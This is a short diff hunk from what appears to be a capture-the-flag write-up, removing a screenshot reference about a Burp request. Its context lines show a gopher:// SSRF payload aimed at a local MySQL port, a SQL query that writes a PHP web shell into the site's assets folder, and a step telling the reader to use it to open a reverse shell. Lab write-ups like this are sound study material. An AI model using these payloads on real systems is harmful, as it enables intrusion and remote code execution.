@@ -124,10 +124,6 @@ gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%
 payload -> select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/assets/cmd.php" #www-data only has access to assets
 {% endhighlight  %}
 
-Burp request with double url
-
-![Untitled](/images/crowsec/exposed/doubleURLEncode.png)
-
 Go to the /assets/<name>.php to access the RCE and create a reverse shell
 
 ## Root Flag
